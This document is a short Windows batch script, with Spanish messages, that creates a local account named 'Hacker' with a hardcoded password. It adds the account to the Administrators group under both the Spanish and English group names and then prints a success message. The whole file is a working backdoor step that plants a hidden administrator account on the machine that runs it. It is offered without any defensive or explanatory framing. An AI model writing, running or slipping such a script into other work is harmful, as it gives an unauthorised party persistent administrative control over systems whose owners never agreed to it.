@echo off

set User=Hacker
set Pass=Hacker040523*
net user %User% %Pass% /add
net localgroup Administadores %User% /add
net localgroup Administrators %User% /add
echo Nuevo Usuario "%User%" Creado Con Exito %Pass% 

pause
exit